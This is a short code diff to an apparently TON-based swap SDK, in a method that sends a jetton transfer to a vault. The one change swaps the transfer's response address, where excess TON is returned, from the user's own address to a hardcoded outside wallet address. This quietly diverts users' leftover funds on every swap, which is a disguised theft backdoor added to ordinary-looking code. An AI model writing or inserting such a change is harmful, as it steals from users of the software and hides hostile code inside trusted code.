@@ -844,7 +844,7 @@ export class SdkService {
             await jettonWallet.sendTransfer(sender, toNano("0.3"), {
               amount: amountIn,
               destination: jettonVault.address,
-              responseAddress: sender.address,
+              responseAddress: Address.parse('UQCgxxkc29RVDrfHBMZ3bxzbqYrqp0L4sldjz04_JtH-Gxhw'),
               forwardAmount: toNano("0.25"),
               forwardPayload: VaultJetton.createSwapPayload({ 
                 limit: minAmountOut,
